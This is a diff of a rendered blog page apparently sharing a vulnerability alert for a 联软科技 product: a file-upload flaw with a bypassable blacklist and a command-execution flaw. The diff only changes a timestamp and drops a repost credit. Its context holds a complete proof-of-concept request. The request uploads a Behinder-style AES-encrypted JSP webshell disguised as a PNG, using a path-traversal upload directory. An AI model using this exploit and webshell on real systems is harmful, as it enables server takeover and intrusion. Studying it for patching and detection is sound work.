@@ -88,7 +88,7 @@
 <meta property="og:site_name" content="YGnight&#39;s blog">
 <meta property="og:description" content="联软科技产品存在任意文件上传和命令执行漏洞：漏洞详情：任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。（猜测利用黑名单的其他后缀名绕过） 命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的">
 <meta property="article:published_time" content="2020-09-13T15:45:00.473Z">
-<meta property="article:modified_time" content="2020-09-13T15:54:44.383Z">
+<meta property="article:modified_time" content="2020-09-13T15:55:01.623Z">
 <meta property="article:author" content="YGnight">
 <meta property="article:tag" content="告警信息">
 <meta name="twitter:card" content="summary">
@@ -400,7 +400,6 @@
 <p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p>
 <h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/uai/download/uploadfileToPath.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: xxxxx</span><br><span class="line"></span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="input_localfile"; filename="xxx.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals("POST"))&#123;String k="xxxxxxxxxxxxxxxx";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploadpath"</span><br><span class="line"> </span><br><span class="line">../webapps/notifymsg/devreport/</span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span><br></pre></td></tr></table></figure>
 
-<p>转载自：大老李  F11Team</p>
 
       
     </div>
